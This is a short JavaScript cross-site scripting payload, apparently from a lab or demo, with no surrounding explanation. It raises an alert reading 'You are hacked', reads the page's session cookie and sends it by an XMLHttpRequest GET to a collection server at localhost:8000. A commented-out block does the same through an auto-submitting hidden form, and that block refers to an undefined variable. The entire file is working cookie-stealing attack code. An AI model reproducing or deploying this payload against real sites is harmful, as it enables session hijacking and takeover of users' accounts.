alert('You are hacked - xss2!');

var sessionCookie = document.cookie;
console.log('sessionCookie: ' + sessionCookie);
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost:8000?cookie=" + sessionCookie, true);
xhr.send();
/*
var form = document.createElement('form');
form.setAttribute('method', 'post');
form.setAttribute('action', 'http://localhost:8000');
form.setAttribute('target', '_blank');

var hiddenField = document.createElement('input');
hiddenField.setAttribute('type', 'hidden');
hiddenField.setAttribute('name', 'cookie');
hiddenField.setAttribute('value', cookie);

form.appendChild(hiddenField);

document.body.appendChild(form);

form.submit();
alert('You are hacked 2!');
*/